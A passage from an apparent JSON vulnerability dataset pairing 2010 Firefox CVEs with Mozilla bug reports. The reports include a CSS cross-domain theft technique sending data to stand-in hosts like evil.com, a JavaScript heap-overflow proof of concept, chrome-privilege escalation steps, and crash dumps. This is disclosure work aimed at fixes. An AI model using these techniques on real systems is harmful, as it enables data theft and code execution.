mMimeTypeCount; i++) { nsCOMPtr<nsIDOMMimeType> mimeType; rv = mPlugin->Item(i, getter_AddRefs(mimeType)); if (rv != NS_OK) break; mimeType = new nsMimeType(this, mimeType); // XXX: /this/ contains our dangling reference NS_IF_ADDREF(mMimeTypeArray[i] = mimeType); } } return rv; } Reload the entire plugin array dom/src/base/nsPluginArray.cpp:199 NS_IMETHODIMP nsPluginArray::Refresh(PRBool aReloadDocuments) { nsresult res = NS_OK; if (!AllowPlugins()) return NS_SUCCESS_LOSS_OF_INSIGNIFICANT_DATA; Delete every element of an nsPluginArray dom/src/base/nsPluginArray.cpp:236 if (mPluginArray != nsnull) { for (PRUint32 i = 0; i < mPluginCount; i++) NS_IF_RELEASE(mPluginArray[i]); // XXX delete[] mPluginArray; } Version(s) tested: FireFox 3.5.6 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-0178": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=546909",
        "title": "Firefox should not load chrome URLs dragged from plugins",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) Firefox will load a chrome:// URL dragged from a Java applet onto the content area. In a Java applet, the default 'mouse drag gesture recognizer' can be overridden so that a drag operation is initiated as soon as the mouse button is held down. As no mouse movement is required, a drag+drop can be 'forced' by getting the user to click the mouse button, and placing the drop target under the mouse cursor as soon as the drag operation has begun. I have devised a test case that will allow chrome-privileged JS to be executed by getting the user to perform only three clicks. It works as follows: 1. Open two popup windows, one in front of the other (first click) 2. In the frontmost window, the user is persuaded to click on a Java applet, starting a drag of a chrome URL (any one will do) 3. Once the drag has started, the frontmost window is resized, so that the content area of the other popup window is underneath the mouse cursor. 4. When the drop is completed, the chrome URL loads in the background popup, and the foreground window is resized to it's original size. 5. The user performs another click on the foreground window. This time, a drag of a malicious Javascript URI is initiated. 6. The foreground window is shrunk again and the mouse button is released over the address bar of the background popup window. 7. The Javascript is executed with chrome privs. I have tested this on Windows XP with the latest Sun Java plugin. It works on both Firefox 3.6 and latest Trunk. I'm not sure if the drag+drop trickery in the Java applet is actually a vulnerability, but Firefox loading a chrome URI definitely is. Reproducible: Always"
      }
    ],
    "CVE-2010-0179": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=504021",
        "title": "Arbitrary code execution with Firebug XMLHttpRequestSpy",
        "description": "spy.js: top.XMLHttpRequestSpy.prototype = { attach: function() { ... this.onreadystatechange = this.xhrRequest.onreadystatechange; When accessing this.xhrRequest.onreadystatechange, content functions (QueryInterface, getInterfaces, etc.) can be called."
      }
    ],
    "CVE-2010-0180": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=561797",
        "title": "[SECURITY] checksetup.pl with $use_suexec=1 sets localconfig as world readable",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-2.fc12 Firefox/3.5.9 Build Identifier: 3.6 localconfig is set as world readable (0644) by checksetup.pl's \"fixing permissions\" section if $suexec is enabled. Reproducible: Always Steps to Reproduce: 1. Extract bugzilla 3.6 2. Run ./checksetup.pl to generate localconfig 3. Edit localconfig setting suexec=1 (and other necessary details) 4. Run ./checksetup.pl again Actual Results: $ ls -l localconfig -rw-r--r-- 1 bugzilla bugzilla 5638 2010-04-26 03:33 localconfig Expected Results: $ ls -l localconfig -rw-r----- 1 bugzilla bugzilla 5638 2010-04-26 03:33 localconfig Although the webserver is stopped from serving localconfig via .htaccess (if $create_htaccess = 1) this will not stop other users with shell access gaining the database password."
      }
    ],
    "CVE-2010-0181": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=452093",
        "title": "Redirect to mailto:address in linked image opens email editor",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 I was notified by an user (\"Reelix\") about a weird behavior with img tags. I wasn't able to find a duplicate, so I thought it might be better to file a report here, despite you probably being aware of the issue. If the request for the image is answered with a response redirecting to a mailto: address, then the default email editor opens. i.e. <img src=\"<page that redirects to mailto:foo@bar>\" /> will cause firefox to open the default email application. or more verbatim: a t.html --snip <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"> <html> <head> <title>mail test</title> </head> <body> <img src=\"t.php\" /> </body> </html> --snap Where t.php redirects to mailto:foo@bar.com?subject=Irritating%20popup&body=I%20d o%20not%20think%20image%20tags%20should%20be%20able%20to%20t his . Opens the email editor. I don't think that image tags should be able to open any external applications and/or cause popups. Thanks for looking into it, cheers ~H Reproducible: Always Steps to Reproduce: 1. write a page with an image tag like <img src=\"foo.php\" /> 2. have foo.php redirect to mailto:foo@bar.com (header('location:mailto:foo@bar.com');) 3. View the page Actual Results: The external email editor opens. Expected Results: Broken image."
      }
    ],
    "CVE-2010-0182": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=490790",
        "title": "XMLDocument::load() doesn't check nsIContentPolicy",
        "description": "nsXMLDocument::load() will do same-origin checks on the URL to be loaded but won't check content policies. I think it should call content policies with TYPE_XMLHTTPREQUEST and use calling document as context."
      }
    ],
    "CVE-2010-0183": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=557174",
        "title": "Use-after-free error in nsCycleCollector::MarkRoots()",
        "description": "wushi of team509 sent the following vulnerability report to security@: ================================================================================ firefox use after free Vulnerability Discovery Date: Sep 20, 2009 Discovery By : wushi of team509 Systems Affected This vulnerability affects the following software : ¡¡¡¡* firefox(3.5.9 tested) * firefox(3.0.15 tested) Overview firefox contains a vulnerability. This vulnerability may allow attackers to remotely execute arbitrary code on the affected system. Exploitation may occur as the result of using the affected webkit application to visit a website. The privileges gained by a remote attacker depend on the software component being attacked. I. Description: unpack the ff2.rar, copy frame.jsp and 1.xhtml files to tomcat webapp dir.use firefox to visit it(I used 3.5.7 on windows xp sp3) firefox will crash. the crash will like this: (21f8.1160): Access violation - code c0000005 (!!! second chance !!!) eax=0073006e ebx=08d0dd00 ecx=0012bb4c edx=00000000 esi=08f902cc edi=0012bba0 eip=0073006e esp=0012bb28 ebp=08d3b5c0 iopl=0 nv up ei ng nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000283 0073006e ?? ??? 0:000> kv ChildEBP RetAddr Args to Child WARNING: Frame IP not in any known module. Following frames may be wrong. 0012bb24 1006dcaa 08d3b5c0 108b63f4 0012bb4c 0x73006e 0012bb88 10175670 0080b000 00000000 008d2000 xul!nsCycleCollector::MarkRoots+0x72a (FPO: [Uses EBP] [1,18,0]) (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 1571] 0012bbec 1017f503 0080b000 00826c00 004edf9e xul!nsCycleCollector::BeginCollection+0x57 (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 2515] 0012bbf8 004edf9e 00826c00 00000002 00826c00 xul!XPCCycleCollectGCCallback+0x3a (FPO: [2,0,0]) (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\js\\src\\xpconnect\\src\\nsxpconnect.cpp @ 390] 0012bca0 00535b5c 00826c00 00000000 00000000 js3250!js_GC+0x28e (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\js\\src\\jsgc.cpp @ 3504] 0012bcb4 10190ab8 00826c00 00826c00 1017f4c9 js3250!JS_GC+0x4c (FPO: [1,0,2]) (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\js\\src\\jsapi.cpp @ 2458] 0012bd70 101826fa 1019e122 00000001 00000002 xul!nsXPConnect::Collect+0x74 (FPO: [0,39,0]) (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\js\\src\\xpconnect\\src\\nsxpconnect.cpp @ 478] 0012fc20 101d6e5f 0080b000 00000001 101d6e29 xul!nsCycleCollector::Collect+0x8a (FPO: [2,4007,0]) (CONV: thiscall) [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 2386] 0012fc2c 101d6e29 1033e3f8 101bc394 00000001 xul!nsCycleCollector_collect+0x11 (FPO: [0,0,0]) (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 3046] 0012fc30 1033e3f8 101bc394 00000001 1019e157 xul!nsJSContext::CC+0x2a (FPO: [0,0,0]) (CONV: cdecl) [e:\\builds\\moz2_slave\\win32_build\\build\\dom\\src\\base\\nsjsenvironment.cpp @ 3534] 0012fc64 1004c1be 08d17c30 0081b5b0 0012ff40 xul!nsJSContext::MaybeCC+0x3381b7 (CONV: cdecl) 0:000> u xul!nsCycleCollector::MarkRoots+0x72a -23 xul!nsCycleCollector::MarkRoots+0x707 [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 1571]: 1006dc87 3d201e0610 cmp eax,offset xul!nsArrayCC::QueryInterface (10061e20) 1006dc8c 0f8464110000 je xul!nsCycleCollector::MarkRoots+0x1876 (1006edf6) 1006dc92 3dc0c90910 cmp eax,offset xul!nsEventListenerManager::QueryInterface (1009c9c0) 1006dc97 0f84ad110000 je xul!nsCycleCollector::MarkRoots+0x18ca (1006ee4a) 1006dc9d 8d4c2414 lea ecx,[esp+14h] 1006dca1 51 push ecx 1006dca2 68f4638b10 push offset xul!nsCycleCollectionISupports::COMTypeInfo<int>::kIID (108b63f4) 1006dca7 55 push ebp 0:000> u xul!nsCycleCollector::MarkRoots+0x728 [e:\\builds\\moz2_slave\\win32_build\\build\\xpcom\\base\\nscyclecollector.cpp @ 1571]: 1006dca8 ffd0 call eax eax set value at here: 1006dc35 8b4d00 mov ecx,dword ptr [ebp] 1006dc38 8b01 mov eax,dword ptr [ecx] 0:000> dd ebp 08d3b5c0 01901400 08cc51b8 00000000 40300000 08d3b5d0 08debee8 00000005 00000005 00000000 08d3b5e0 08d3b600 08d3b500 08de3b60 00000000 08d3b5f0 00000000 00000000 00000000 00000000 08d3b600 08d3b620 08d3b5e0 08de3b80 00000000 08d3b610 00000000 00000000 00000000 00000000 08d3b620 08d3b640 08d3b600 08de3ba0 00000000 08d3b630 00000000 00000000 00000000 00000000 0:000> dd 01901400 01901400 0073006e 00440049 004d004f 006f004e 01901410 00650064 00650053 0065006c 00740063 01901420 0072006f 00000000 00000000 00000000 01901430 00540053 00540041 005f0045 00530049 01901440 0044005f 0043004f 004d0055 004e0045 01901450 00000054 017e38ac 00000000 00020004 01901460 0073006e 00530049 0063006f 0065006b 01901470 00540074 00610072 0073006e 006f0070 in source code, void nsCycleCollector::MarkRoots(GCGraphBuilder &builder) { mGraph.mRootCount = builder.Count(); // read the PtrInfo out of the graph that we are building NodePool::Enumerator queue(mGraph.mNodes); while (!queue.IsDone()) { PtrInfo *pi = queue.GetNext(); builder.Traverse(pi); } } PRBool nsCycleCollector::BeginCollection() { if (mParams.mDoNothing) return PR_FALSE; GCGraphBuilder builder(mGraph, mRuntimes); .................... MarkRoots(builder); ............ } In these functions we can know, One Graph node has been freed, so made the mistake. in 1.xhtml, we can find the code: <xht:isindex d=\"\"/> \"isindex\" will create a graph object, it seems because the \"isindex\" keyword made the mistake. It's clear , it's a exploitable vuln. ================================================================================"
      }
    ],
    "CVE-2010-0220": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=507114",
        "title": "[Win] Topcrasher for Firefox 3.5.1 [@ memmove | nsTArray_base::ShiftData(unsigned int, unsigned int, unsigned int, unsigned int)][@ nsObserverList::FillObserverArray]",
        "description": "There is a #1 topcrasher on 1.9.1 with the following stack. This bug has been filed by request on bug 494617. Some comments: * Playing games at Iwon.com - lost all my coins! * Took me off the scrabble game i was playing through the facebook link. Was the first game that i was playing for the night, hadnt even put my first word up. * im not understanding why i keep getting these low memory warnings i have deleted firfox and reinstalled it and still get this warnings. why dose this happen on this site. Stack: 0 mozcrt19.dll memmove MEMCPY.ASM:188 1 xul.dll nsTArray_base::ShiftData obj-firefox/xpcom/build/nsTArray.cpp:173 2 xul.dll nsObserverList::FillObserverArray xpcom/ds/nsObserverList.cpp:110 3 xul.dll xul.dll@0x8aea63"
      }
    ],
    "CVE-2010-0654": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=524223",
        "title": "Cross-domain data theft using CSS",
        "description": "From Chris Evans: The attack involves cross-domain CSS stylesheet loading. Because the CSS parser is very lax, it will skip over any amount of preceding and following junk, in its quest to find a valid selector. Here is an example of a valid selector: body { background-image: url('http://www.evil.com/blah'); } If a construct like this can be forced to appear anywhere in a cross-domain document, then cross-domain theft may be possible. The attacker can introduce this construct into a page by injecting two strings: 1) {}body{background-image:url('http://google.com/ (Note that the seemingly redundant {} is to resync the CSS parser to make sure the evil descriptor parses properly. Further note that having the url start like a valid url is required to steal the text in some browsers). 2) ');} Any anything between those two strings will then be cross-domain stealable! The data is stolen cross domain with e.g. window.getComputedStyle(body_element, null).getPropertyValue('background-image'); (This works in most browsers; for IE, you use ele.currentStyle.backgroundImage) There are a surprising number of places in internet sites where an attacker can do this. It can apply to HTML, XML, JSON, XHTML, etc. At this point, an example is probably useful. To set up for this example, you need: a) Get a Yahoo! Mail account. b) Make sure you are logged into it. c) E-mail the target victim Yahoo! account with the subject ');} d) Wait a bit, so that some sensitive e-mails fill the inbox. (Or just simulate one). e) E-mail the target victim Yahoo! account with the subject {}body{background-image:url('http://google.com/ f) Send victim to theft page https://cevans-app.appspot.com/static/yahoocss.html g) The stolen text shown is achieved via cross-domain CSS theft. Other good examples I've had success with are social networking sites, where the attacker gets to leave arbitrary-text comments which are rendered on the victim's trusted page. The main common construct that prevents exploitation is newlines. Obviously, newlines cannot be considered a defense! Escaping or encoding of quote characters can also interfere with exploitation. One useful trick: if ' is escaped, use \" to enclose the CSS string. Part 2 (on possible solutions) to follow. Possible solutions. First, there are some solutions it is easy to reject: 1) Restrict read of CSS text if it came from a different domain. This is a useful defense that I filed a while ago in a different bug. But it will not help in this case. The attacker can simply use http://www.attacker.com/ as a prefix for the background-image value, and wait for the HTTP GET to arrive which includes the stolen text in the payload. 2) Do not send cookies for cross-domain CSS loads. This probably breaks a load of sites? It is certainly a riskier approach. I have not dared try it! The solution that I'm playing with is as follows: - Activate \"strict MIME type required\" in the event that the CSS was loaded (via link tag or @import) as a cross-domain resource. - Also, crash hard if a CSS load fails due to strict MIME type test failure. I've been running my build locally with these changes for a few days and there seems to be some merit in this approach, i.e. my browser hasn't crashed apart from when I hit my attack URLs. I see that WebKit has a history of defaulting to \"strict MIME type required\" for _all_ CSS loads, and that historically broke some sites like dell.com and was reverted. Perhaps the web at large now has its MIME types in order well enough to at least enforce strict for cross-domain CSS loads? If too much breaks, we have the additional level we can introduce of trying to parse the cross-domain CSS but bailing on first syntax error. I'd like to avoid a test that is going that deep into nuance, however."
      }
    ],
    "CVE-2010-1028": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552216",
        "title": "WOFF heap corruption due to integer overflow",
        "description": "Evgeny L. from Vulndisco reported a crash due to a buffer overflow in our WOFF parser. I am able to reproduce the crash, but the stack I get doesn't appear to be in font parser code. I'll try it in a debug build shortly to see if it looks any different. Here's the crash report where it looks like we're calling null: 0bc35855-ee77-4c61-b469-c7c482100313 To reproduce, run the attached python script ff1.py and load http://localhost:8080/1.html"
      }
    ],
    "CVE-2010-1121": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=555109",
        "title": "Move wrappers to new scope even if their parent hasn't been moved yet (ZDI-CAN-761)",
        "description": "Placeholder for Pwn2Own bug found in Firefox at CanSecWest 2010 (CVE-2010-1121)."
      }
    ],
    "CVE-2010-1122": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552216",
        "title": "WOFF heap corruption due to integer overflow",
        "description": "Evgeny L. from Vulndisco reported a crash due to a buffer overflow in our WOFF parser. I am able to reproduce the crash, but the stack I get doesn't appear to be in font parser code. I'll try it in a debug build shortly to see if it looks any different. Here's the crash report where it looks like we're calling null: 0bc35855-ee77-4c61-b469-c7c482100313 To reproduce, run the attached python script ff1.py and load http://localhost:8080/1.html"
      }
    ],
    "CVE-2010-1125": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552255",
        "title": "focus() behavior may be used to inject, maybe steal keystrokes",
        "description": "Hi folks, I originally thought this only applies to WebKit, but realized it can be tweaked to work with Firefox only after making this proof-of-concept public. Sorry for that - it's fairly low risk, but probably interesting: http://lcamtuf.coredump.cx/focus-webkit/ This PoC is probably Windows-specific. Unlike clickjacking, this permits a fairly high degree of sophistication in interacting with third-party sites. An obvious way to mitigate the risk is to mimic the behavior of MSIE / Opera - that is: 1) Forbid or defer focus changes between onkeydown and onkeyup, so that a malicious page can't see what's being pressed, but deliver the result elsewhere, 2) When focus is grabbed by another document in an IFRAME, and then returned, we should probably not attempt to restore it to the last known editing location, but reset it instead. Now, the more interesting part. NOTE: THIS PART OF THE BUG IS NOT PUBLIC. We also noticed that the following is possible in WebKit browsers, and to a more limited extent and with some tweaks, in MSIE: http://lcamtuf.coredump.cx/focus-webkit/toplevel.html In essence, the same attack can be reversed, and allow cross-domain IFRAME gadgets to steal keystrokes (including password field entries) transparently. This attack does not work on Firefox as-is, but this seems to be due to a conjunction of what I presume are two bugs; and not a conscious security decision: 1) Calling top.focus() always seem to be silently ignored, even if the current browser window is, in fact, in focus, and the call is being made from a currently in-focus IFRAME on that page. In other browsers, this simply returns focus to the top-level document. In Firefox, it does not, presumably because of an overzealous anti-annoyance filter meant to prevent pop-ups from doing setInterval('focus()',1). 2) The other way to approach this would be to call <iframedwindow>.blur(), but counterintuitively, this blurs the entire browser window (and amusingly, doing setInterval('blur()',1) from within an IFRAME makes the browser unusable). This looks like something that may eventually get fixed by accident. I suspect there might be some other way to restore focus to the top-level doc, but I have no obvious ideas. Even if not, it is a more compelling argument to implement the aforementioned changes to focus behavior."
      }
    ],
    "CVE-2010-1126": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552255",
        "title": "focus() behavior may be used to inject, maybe steal keystrokes",
        "description": "Hi folks, I originally thought this only applies to WebKit, but realized it can be tweaked to work with Firefox only after making this proof-of-concept public. Sorry for that - it's fairly low risk, but probably interesting: http://lcamtuf.coredump.cx/focus-webkit/ This PoC is probably Windows-specific. Unlike clickjacking, this permits a fairly high degree of sophistication in interacting with third-party sites. An obvious way to mitigate the risk is to mimic the behavior of MSIE / Opera - that is: 1) Forbid or defer focus changes between onkeydown and onkeyup, so that a malicious page can't see what's being pressed, but deliver the result elsewhere, 2) When focus is grabbed by another document in an IFRAME, and then returned, we should probably not attempt to restore it to the last known editing location, but reset it instead. Now, the more interesting part. NOTE: THIS PART OF THE BUG IS NOT PUBLIC. We also noticed that the following is possible in WebKit browsers, and to a more limited extent and with some tweaks, in MSIE: http://lcamtuf.coredump.cx/focus-webkit/toplevel.html In essence, the same attack can be reversed, and allow cross-domain IFRAME gadgets to steal keystrokes (including password field entries) transparently. This attack does not work on Firefox as-is, but this seems to be due to a conjunction of what I presume are two bugs; and not a conscious security decision: 1) Calling top.focus() always seem to be silently ignored, even if the current browser window is, in fact, in focus, and the call is being made from a currently in-focus IFRAME on that page. In other browsers, this simply returns focus to the top-level document. In Firefox, it does not, presumably because of an overzealous anti-annoyance filter meant to prevent pop-ups from doing setInterval('focus()',1). 2) The other way to approach this would be to call <iframedwindow>.blur(), but counterintuitively, this blurs the entire browser window (and amusingly, doing setInterval('blur()',1) from within an IFRAME makes the browser unusable). This looks like something that may eventually get fixed by accident. I suspect there might be some other way to restore focus to the top-level doc, but I have no obvious ideas. Even if not, it is a more compelling argument to implement the aforementioned changes to focus behavior."
      }
    ],
    "CVE-2010-1196": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=534666",
        "title": "Heap buffer overflow and crash [@ nsGenericDOMDataNode::SetTextInternal] on 64-bit",
        "description": "Nils reported this bug to security@mozilla.org. Here's his full message: ----- Firefox 3.5 64-Bit nsGenericDOMDataNode::SetTextInternal I found a heap buffer overflow vulnerability which is caused by a integer overflow in nsGenericDOMDataNode::SetTextInternal(). Due to the amount of data needed to trigger the vulnerability (> 8 gigbytes), this is only exploitable on 64-bit systems. It was tested on Ubuntu AMD64 with the default install of Firefox and a custom build of Firefox on the same system. The vulnerable code is in nsGenericDOMDataNode::SetTextInternal() content/base/src/nsGenericDOMDataNode.cpp:399: PRInt32 newLength = textLength - aCount + aLength; PRUnichar* to = new PRUnichar[newLength]; NS_ENSURE_TRUE(to, NS_ERROR_OUT_OF_MEMORY); // Copy over appropriate data if (0 != aOffset) { mText.CopyTo(to, 0, aOffset); } if (0 != aLength) { memcpy(to + aOffset, aBuffer, aLength * sizeof(PRUnichar)); } With a very large aLength or textLength an attacker would be able to wrap the integer newLength, resulting in an allocation of a too small buffer. When aLength is large than zero the memcpy() will overflow the buffer. A fix would use size_t or similar value types for all length values. Furthermore the result of calculations which may wrap should be checked. The following Proof-of-Concept code will trigger the bug. Note that there will be multiple ways of triggering the issue: POC Code: ------------------------- test.js ------------------------------ // fast way of allocating huge strings function getlongstr(leng) { var str = unescape(\"%udead\"); var tsize = leng; while(str.length < ((tsize/6)/0x10)) str += str; str = str.substring(0, ((tsize/6)/0x10)); var sz = tsize / 6; var comp = str.length; var ar = new Array(); var act = 0; for(var i=0; i<0x11; i++) { act += comp; ar.push(str); } var longstr = ar.join(\"\"); longstr = longstr.substring(0, tsize/6); ar = null; str = null; longstr = escape(longstr); return longstr; } function start() { var appendStr = \"AA\"; while(appendStr.length < 16500) appendStr+=appendStr; var x= document.createComment(\"\"); alert(\"created comment\"); var longstr = getlongstr(0xfffffffc); x.appendData(appendStr); x.insertData(0x7f80, longstr); alert(\"done\"); } start(); ----------------------------------------------------------------- Provided the test system has enough memory (>8 gigabyte) following crash will be triggered: Stack backtrace: Program received signal SIGSEGV, Segmentation fault. 0x00007ffff6ddf7ca in nsGenericDOMDataNode::SetTextInternal ( this=0x7fffddbc9380, aOffset=32640, aCount=1992294400, aBuffer=0x7ffcf6cf7954, aLength=4294967292, aNotify=1) at /usr/include/bits/string3.h:52 52 return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest)); (gdb) bt 10 #0 0x00007ffff6ddf7ca in nsGenericDOMDataNode::SetTextInternal ( this=0x7fffddbc9380, aOffset=32640, aCount=1992294400, aBuffer=0x7ffcf6cf7954, aLength=4294967292, aNotify=1) at /usr/include/bits/string3.h:52 #1 0x00007ffff731f139 in NS_InvokeByIndex_P (that=0x7fffffffc430, methodIndex=4294951152, paramCount=32767, params=0x7fffddc24000) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_linux.cpp:208 #2 0x00007ffff6b42b81 in XPCWrappedNative::CallMethod (ccx=..., mode=16) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/xpconnect/src/xpcwrappednative.cpp:2456 #3 0x00007ffff6b4a5fb in XPC_WN_CallMethod (cx=0x7fffe3356000, obj=0x7ffc771cc100, argc=3720560384, argv=0x1ffa33ef8, vp=0x8000) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1590 #4 0x00007ffff6434383 in js_Invoke (cx=0x7fffe3356000, argc=32767, vp=0x7fffe237e160, flags=32767) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1386 #5 0x00007ffff64255bc in js_Interpret (cx=0x7fffe3356000) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:5179 #6 0x00007ffff643438d in js_Invoke (cx=0x7fffe3356000, argc=32767, vp=0x7fffe237e040, flags=32767) ---Type <return> to continue, or q <return> to quit--- at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1394 #7 0x00007ffff64346e4 in js_InternalInvoke (cx=0x7fffe3356000, obj=0x7fffddb90480, fval=140736913381888, flags=0, argc=32768, argv=0x7f80, rval=0x7ffff63fc8e5) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1447 #8 0x00007ffff63fc8e5 in JS_CallFunctionValue (cx=0x7fffe3356000, obj=0x7ffc771cc100, fval=140736913948416, argc=4288888568, argv=0x8000, rval=0x7f80) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsapi.cpp:5187 #9 0x00007ffff6ef9126 in nsJSContext::CallEventHandler (this=0x7fffe65fb760, aTarget=0x7ffc771cc100, aScope=0x7fffddc33f00, aHandler=0x7fffddba9a00, aargv=0x7fffe3356000, arv=0x7fffffffceb0) at /home/nils/64-bit/audit/firefox/mozilla-1.9.1/dom/src/base/nsJSEnvironment.cpp:2085 (More stack frames follow...)"
      }
    ],
    "CVE-2010-1197": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=537120",
        "title": "Content-Disposition: attachment ignored if Content-Type: multipart also present",
        "description": "Ilja van Sprundel from IOActive reported this issue to security@m.o. When we receive both a C-D:attachment and a C-T:multipart header, we follow the C-T header and display the content inline. This could potentially lead to XSS if a site lets users specify Content-Type for a file but rely on C-D to serve the file as an attachment. Apparently, other browsers honor the C-D header. I tested in Chromium and that is the case. (filing as sec-sensitive for now) ------- Hey Guys, There's a small security bug in FF that would allow files that are offered as a download to be rendered as inline html instead: If Content-Disposition is set to attachment, but content-type is set to multipart (attacker controlled),then the content-disposition is ignored, and the content is seen as a mime header.if that mime header defines a content-type of text/html then it will be rendered inline. This allows for XSS on some webapplications. specifically webapplications that allow an attacker to upload a file, and set it's content-type, but where the webapp sets the content disposition to attachment, trying to force the user to download the file, instead of rendering the content inline (this is actually quite common, e.g. a webmail application, webapp allowing users to upload and download files, ...). Firefox appears to be the only browser that does this. IE, chrome and safari will honor the content-disposition and just offer it as a download. testes both on FF 3.0 and and 3.5. Regards, Ilja van Sprundel."
      }
    ],
    "CVE-2010-1198": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=532246",
        "title": "Investigate crash caused by Java plug-in using deleted WMP plug-in object (MSVR-09-0049)",
        "description": "Microsoft Vulnerability Research reported this issue to security@m.o today. They included a advisory paper as well as a proof-of-concept for an exploit, though I was unable to get it to work (the author does say it works only about 20% of the time). The PoC requires Windows Media Player and JRE plug-ins to be installed. I will upload the attached materials shortly. The short summary is that plug-in A can get a reference to a NPObject from plug-in B and wait for plug-in B to be unloaded from a page, resulting in plug-in A having a dangling pointer to the freed NPObject."
      }
    ],
    "CVE-2010-1199": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=554255",
        "title": "XSLT Sort Remote Code Execution Vulnerability (ZDI-CAN-747)",
        "description": "Reported to the security alias: ZDI-CAN-747: Mozilla Firefox XSLT Sort Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or render a malicious file. The specific flaw exists within a particular XSLT transformation when applied to an XML document. If a large number of elements have this transformation applied to them, the application will misallocate a buffer. Upon usage of this buffer, the application will copy more data than allocated thus causing an overflow. This can lead to code execution under the context of the application. This bug is triggered via the XSLT sort function and is implemented in the following code. Upon evaluating of an XML statement, the application will execute the following code. This code will count the number of sort keys, and then add each key to a txNodeSorter element. content/xslt/src/xslt/txInstructions.cpp:646 nsresult txPushNewContext::execute(txExecutionState& aEs) { nsRefPtr<txAExprResult> exprRes; nsresult rv = mSelect->evaluate(aEs.getEvalContext(), getter_AddRefs(exprRes)); // XXX NS_ENSURE_SUCCESS(rv, rv); if (exprRes->getResultType() != txAExprResult::NODESET) { // XXX ErrorReport: nodeset expected return NS_ERROR_XSLT_NODESET_EXPECTED; } txNodeSet* nodes = static_cast<txNodeSet*> (static_cast<txAExprResult*> (exprRes)); // XXX: nodes to sort if (nodes->isEmpty()) { aEs.gotoInstruction(mBailTarget); return NS_OK; } txNodeSorter sorter; PRUint32 i, count = mSortKeys.Length(); for (i = 0; i < count; ++i) { SortKey& sort = mSortKeys[i]; rv = sorter.addSortElement(sort.mSelectExpr, sort.mLangExpr, // XXX: number of sort keys sort.mDataTypeExpr, sort.mOrderExpr, sort.mCaseOrderExpr, aEs.getEvalContext()); NS_ENSURE_SUCCESS(rv, rv); } nsRefPtr<txNodeSet> sortedNodes; rv = sorter.sortNodeSet(nodes, &aEs, getter_AddRefs(sortedNodes)); // XXX NS_ENSURE_SUCCESS(rv, rv); This code will then add the specified key to the list of nodes to be sorted. content/xslt/src/xslt/txNodeSorter.cpp:68 nsresult txNodeSorter::addSortElement(Expr* aSelectExpr, Expr* aLangExpr, Expr* aDataTypeExpr, Expr* aOrderExpr, Expr* aCaseOrderExpr, txIEvalContext* aContext) { ... // mSortKeys owns key now. rv = mSortKeys.add(key); NS_ENSURE_SUCCESS(rv, rv); key.forget(); 